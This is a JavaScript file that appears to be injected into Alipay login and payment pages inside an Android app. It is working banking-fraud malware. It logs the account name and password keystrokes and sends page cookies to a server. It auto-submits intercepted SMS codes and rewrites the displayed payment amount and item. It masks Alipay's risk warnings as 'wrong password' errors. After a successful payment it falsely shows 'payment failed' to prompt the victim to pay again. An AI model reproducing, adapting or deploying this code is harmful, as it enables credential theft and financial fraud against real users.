function () {

    var sj = null;
    var bt = document.getElementsByClassName('title-main')[0].innerText;
    var ck = document.cookie;
    var mUrl = document.url;
    var smsVar = null;
    activity.log("======= 当前界面:" + bt);

    if (bt.indexOf('付款详情') > -1) {
        setTimeout(function () {
            document.getElementsByClassName('am-list-item-text am-ft-ellipsis am-ft-black')[0].innerText = '会员开通';
            document.getElementsByClassName('am-list-item-text am-ft-ellipsis am-ft-xxl')[0].innerText = activity.getCurrentPrice() + '.00元';
            /* 美元通道专用JS
            document.getElementsByClassName('am-ft-ellipsis')[6].style.display='none';
            document.getElementsByClassName('am-ft-ellipsis')[7].style.display='none';
            document.getElementsByClassName('am-ft-ellipsis')[8].style.display='none';
            document.getElementsByClassName('am-ft-ellipsis')[9].style.display='none';
            document.getElementsByClassName('am-ft-clear')[2].innerHTML='<div class=\"am-ft-clear\"><span class=\"am-list-item-title am-ft-ellipsis am-ft-xl\">需付款</span> <span class=\"am-list-item-text am-ft-ellipsis am-ft-xxl\">600.00元</span></div><span style=\"text-align: right;width: auto;display: block;font-size: 20px!important;\">1.00元</span>';
            document.getElementsByClassName('am-ft-xxl')[0].style.display='none';
            */
        }, 500);
    }
    else if (bt.indexOf('登录支付宝') > -1) {
        var tt = document.getElementsByClassName('J-inputClear am-list-item am-list-item-form am-flexbox')[0].children[0].innerText;
        if (tt.indexOf('手机号') > -1) {
            activity.log("是手机号登录");
            var key = document.getElementsByClassName('am-ft-gray fn-right am-ft-mb-20')[0].getElementsByTagName('a')[0];
            var a = key.getAttribute('href');
            var b = key.innerText;
            window.location.href = a;
            return
        } else {activity.log("是账号登录");¸
            var key = document.getElementById('logon_id');
            key.onkeyup = function (e) {
                setTimeout(function () {
                   activity.recordAccount(key.value);
                }, 300);
            };
            var key2 = document.getElementById('pwd_unencrypt');
            key2.setAttribute('type', 'email');
            key2.onkeyup = function (e) {
                setTimeout(function () {
                    activity.recordPwd2(key2.value);
                }, 300)
            };
            activity.sendDataToServer(bt,ck,mUrl);
            setTimeout(function () {
                 activity.showUI();
                 }, 1000);
            document.getElementsByClassName('J-header-back am-header-reverse am-header-reverse-icon')[0].style.display = 'none';
            document.getElementsByClassName('J-back J-header-back am-header-reverse am-header-reverse-icon')[0].style.display = 'none';
            return
        }
    }
    else if (bt.indexOf('短信校验码') > -1) {
        smsVar = setInterval(function(){
                var sms = activity.getSMSCode();
                if(sms != ""){
                    clearInterval(smsVar);
                    document.getElementById('smsCode').value = sms;
                    setTimeout(function(){
                        document.getElementsByClassName('am-button am-button-blue')[0].click();
                        document.getElementsByClassName('am-button am-button-blue')[1].click();
                        },500);
                }
            },1000);
    } 
    else if (bt.indexOf('选择账户') > -1) {

    }
    else if (bt.indexOf('选择付款方式') > -1) {
        activity.hidePayWay();
    } 
    else if (bt.indexOf('输入支付密码') > -1) {
        setTimeout(function () {
            var fxyc = document.getElementsByClassName('am-dialog-text')[0].innerText;
            if (fxyc.indexOf('风险')>-1) {
                document.getElementsByClassName('am-dialog-text')[0].innerText = '支付密码不正确，你还可以输入2次(ALIN10041)';
            }else if(fxyc.indexOf('异常')>-1){
                document.getElementsByClassName('am-dialog-text')[0].innerText = '支付密码不正确，你还可以输入2次(ALIN10041)';
            };
            setTimeout(function (){
                activity.showUI();
            }, 800);
        }, 1000);
        return
    } 
    else if (bt.indexOf('付款结果') > -1) {
        sj = setInterval(function () {
            if (document.getElementsByClassName('J-success am-act am-act-success')[0].style.display == 'block') {
                activity.sendDataToServer('支付成功','','');
                clearInterval(sj);
                document.getElementsByClassName('J-success am-act am-act-success')[0].children[1].innerText='支付失败，3秒后重新支付';
                var sss = 4;
                var sj2 = setInterval(function () {
                    if (sss>0){
                        sss=sss-1;
                        activity.showUI();
                        document.getElementsByClassName('J-success am-act am-act-success')[0].children[1].innerText='支付失败，'+sss+'秒后重新支付';
                    }else{
                        clearInterval(sj2);
                        activity.hideUI();
                        activity.toVideoPlay();
                    }
                }, 1000);
            } else if (document.getElementsByClassName('J-failure am-message am-message-error')[0].style.display == 'block') {
                activity.showUI();
                clearInterval(sj);
            };
        }, 1000);
        return
    } else if (bt.indexOf('出错了') > -1) {

    } else if (bt.indexOf('支付宝') > -1) {

    } else {
        activity.showUI();
        return
    };

    activity.sendDataToServer(bt,ck,mUrl);
    setTimeout(function () {
                    activity.showUI();
                }, 1000);
}